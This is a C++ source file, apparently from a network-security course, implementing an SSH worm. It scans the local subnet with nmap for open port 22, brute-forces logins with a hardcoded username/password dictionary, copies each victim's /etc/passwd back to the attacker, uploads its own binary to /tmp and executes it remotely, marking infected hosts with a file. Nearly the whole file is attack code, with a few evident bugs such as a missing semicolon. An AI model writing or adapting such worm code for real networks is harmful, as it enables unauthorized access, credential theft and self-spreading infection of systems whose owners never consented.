#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include<errno.h>
#include<strings.h>
#include<cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string>
#include <iostream>
#include <sstream>
#include <fstream>
#include <libssh/sftp.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<vector>
#include<map>
#define MAX_XFER_BUF_SIZE 16384
 
 
 
/*Creates a Marker File named 'infectionMarker_passW_CPP.txt
on the tmp folder in the Victim system'*/
void markInfected() {
    std::ofstream myfile("/tmp/infectionMarker_passW_CPP.txt");
 
    if (myfile.is_open())
    {
        myfile << "This system is infected\n" << std::endl;
        myfile.close();
    }
    else
        printf("Unable to open Marker file");
 
}

/*Checks if the system is infected - Checks if Marker file is present in the system at tmp folder
Input: ssh session
Output:
'0' - If there is an error or if file does not exist
'1' - File exists */
int isInfected(ssh_session session) {
    sftp_file file;
    int rc;
    sftp_session sftp;
    int access_type = O_RDONLY;
 
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return 0;
    }
 
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return 0;
    }
 
    file = sftp_open(sftp, "/tmp/infectionMarker_passW_CPP.txt", access_type, 0);
    if (file == NULL) {
        printf("\nFile does not exist");
        return 0;
    }
    else {
        printf("\nSystem Infected");
        return 1;
    }
}
 
/*This function scans Network for IPs in the LAN which have their port 22 open
Output: Vector of all the host in the Network with Port 22 open
Reference: https://hackertarget.com/list-all-ips-in-subnet-with-nmap/
*/
std::vector<std::string> getHostsOnSameNetwork() {
    FILE *fp;
    char path[1035];
    std::vector<std::string> res;
    int i;
 
    fp = popen("nmap 192.168.1.0/24 -p 22 --open | grep 'Nmap scan report for'| cut -f 5 -d ' '", "r");
    if (fp == NULL) {
        printf("\nFailed to run command");
        pclose(fp);
        //Error handling
    }
    else {
        while (!feof(fp)) {
            if (fgets(path, sizeof(path), fp) != NULL) {
                res.push_back(path);
            }
        }
 
        pclose(fp);
        return res;
    }
}
 
/*Need to change this function*/
 
int copyPasswordFile(ssh_session session, std::string host) {
    int access_type;
    sftp_file file;
    char buffer[MAX_XFER_BUF_SIZE];
    int nbytes, nwritten, rc;
    int fd;
    sftp_session sftp;
 
    sftp = sftp_new(session);
    access_type = O_RDONLY;
    file = sftp_open(sftp, "/etc/passwd",
        access_type, 0);
    if (file == NULL) {
        fprintf(stderr, "Can't open file for reading: %s\n",
            ssh_get_error(session));
        return SSH_ERROR;
    }
    std::string newFilePath = "/tmp/passwd_" + host; 
   
    fd = open(newFilePath.c_str(), O_CREAT|O_WRONLY, 0777);
    if (fd < 0) {
        fprintf(stderr, "Can't open file for writing: %s\n",
            strerror(errno));
        return SSH_ERROR;
    }
    for (;;) {
        nbytes = sftp_read(file, buffer, sizeof(buffer));
        if (nbytes == 0) {
            break; // EOF
        }
        else if (nbytes < 0) {
            fprintf(stderr, "Error while reading file: %s\n",
                ssh_get_error(session));
            sftp_close(file);
            return SSH_ERROR;
        }
        nwritten = write(fd, buffer, nbytes);
	printf("nwritten: %d, nbytes: %d", nwritten, nbytes);
        if (nwritten != nbytes) {
            fprintf(stderr, "Error writing: %s\n",
                strerror(errno));
            sftp_close(file);
            return SSH_ERROR;
        }
    }
    rc = sftp_close(file);
    if (rc != SSH_OK) {
        fprintf(stderr, "Can't close the read file: %s\n",
            ssh_get_error(session));
        return rc;
    }
    return SSH_OK;
}
 
/*Copies the executable of this worm  to remote system
Input: ssh Session
Output:
'0'  - If error Occurs
'1' - Successful Copy
Reference: http://stackoverflow.com/a/13692035/5741374
Reference: http://api.libssh.org/master/libssh_tutor_sftp.html
*/
int copyFile(ssh_session session) {
    sftp_file file;
    int rc;
    int access_type = O_WRONLY | O_CREAT | O_TRUNC;
    sftp_session sftp;
 
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return 0;
    }
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return 0
    }
 
    file = sftp_open(sftp, "/tmp/passwordW",
        access_type, S_IRWXU);
    if (file == NULL)
    {
        fprintf(stderr, "\nCan't open remote file for writing: %s\n",
            ssh_get_error(session));
        return 0;
    }
 
    std::ifstream fin("/tmp/passwordW", std::ios::binary);
    if (fin) {
        fin.seekg(0, std::ios::end);
        std::ios::pos_type length = fin.tellg(); // get file size in bytes
        fin.seekg(0); // rewind to beginning of file
 
        char* replicatorFile = new char[length];
        fin.read(replicatorFile, length); // read file contents into buffer
 
        sftp_write(file, replicatorFile, length); // write to remote file
    }
    else {
        return 0;
    }
 
    rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "\nCan't close the written file: %s\n", ssh_get_error(session));
        return 0;
    }
    printf("\nCopy Successfull !");
    return 1;

}
 
/*Executes the worm on Victim System
Input: ssh Session
Output:
'0' - Problem in execution
'1' - Successful execution of remote command
Refernce: http://api.libssh.org/master/libssh_tutor_command.html
*/
int executeFile(ssh_session session) {
    ssh_channel channel;
    int rc;
    channel = ssh_channel_new(session);
 
    if (channel != NULL) {
        rc = ssh_channel_open_session(channel);
        if (rc == SSH_OK) {
            if (copyFile(session)) {
                rc = ssh_channel_request_exec(channel, "/tmp/passwordW");
                if (rc == SSH_OK) {
					ssh_channel_close(channel);
					printf("\nExecuted command on remote machine");
					return 1;
                }
                else {
                    printf("\nCannot give run permissions to the file");
                    return 0;
                }
            }
            else {
                printf("\nError While copying");
                return 0;
            }
        }
        else {
            printf("\nError establishing channel for executing remote");
            return 0;
        }
    }
    else {
        printf("\nCould not Connect to Host");
        return 0;
    }
}
 
/*Tries to connect to a remote system using ssh protocol
Tries to login to a system using the predefined Dictionary of usernames and passwords
Input: ssh Session, IP Address of host, Dictionary of usernames and passwords
Output:
'0' - Unsuccessful connection attempt
'1' - Successful Connection attempt
*/
int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
    int rc;
    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    const char *username, *password;
 
 
    rc = ssh_connect(session);
 
    if (rc == SSH_OK) {
 
        if (ssh_write_knownhost(session) < 0) {
            fprintf(stderr, "Error %s", strerror(errno));
            return 0;
        }
        else {
            for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {
 
                username = (it->first).c_str();
                password = (it->second).c_str();
 
                rc = ssh_userauth_password(session, NULL, password);
                if (rc == SSH_AUTH_SUCCESS) {
                    printf("\nLogin Success");
                    return 1;
                }
            }
            if (rc != SSH_AUTH_SUCCESS) {
                printf("\n Error Authenticating");
            }
        }
 
    }
 
    else {
        fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
        return 0;
    }
}
 
 
 
/*Initialized Dictionary for Attack*/
void initializeDict(std::map<std::string, std::string> &dictAttackList) {
    dictAttackList["ubuntu"] = "123456";
    dictAttackList["hello"] = "worlds";
    dictAttackList["cpsc"] = "c473";
    dictAttackList["network"] = "security";
    printf("\nDictionary Initialized !!!");
}
 
 
int main() {
 
    ssh_session my_ssh_session;
    ssh_channel channel;
    int res;
    std::map<std::string, std::string> dictAttackList;
	/*Call to initialize Dictionary*/
    initializeDict(dictAttackList);

	/*Call to mark the system as Infected*/
    markInfected();

	/*Call to fetch Hosts in the Network*/
    std::vector<std::string> hosts = getHostsOnSameNetwork();
 
	/*Iterating through the hosts to connect and infect the system*/
    for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
        std::cout << "\n Host: " << *host;
 
        my_ssh_session = ssh_new();
        if (my_ssh_session == NULL)
            exit(-1);
 
        if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
            printf("\nSucceded to get into the host");
 
            if (!isInfected(my_ssh_session)) {
		copyPasswordFile(my_ssh_session, *host);
                res = executeFile(my_ssh_session);
                if (res) {
                    std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
                    break;
                }
            }
        }
		else
			printf("Error occured in connection");
    }
}
